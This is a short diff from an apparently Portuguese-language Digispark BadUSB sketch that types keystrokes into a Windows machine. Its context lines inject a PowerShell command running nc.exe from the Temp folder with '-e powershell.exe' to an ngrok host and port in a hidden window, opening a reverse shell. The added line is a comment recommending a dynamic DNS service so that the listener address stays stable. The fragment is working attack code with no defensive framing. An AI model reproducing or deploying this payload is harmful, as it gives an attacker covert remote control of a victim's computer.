@@ -17,6 +17,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(1000);
   //a porta da utilizada para a reverse shell muda cada vez que inicia o ngrok
+  //podemos usar o (https://www.noip.com/pt-BR) para solucionar isso ;)
   DigiKeyboard.print("Start-Process 'C:\\Windows\\Temp\\nc.exe' -ArgumentList '-e powershell.exe','0.tcp.sa.ngrok.io ','16392' -WindowStyle Hidden");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
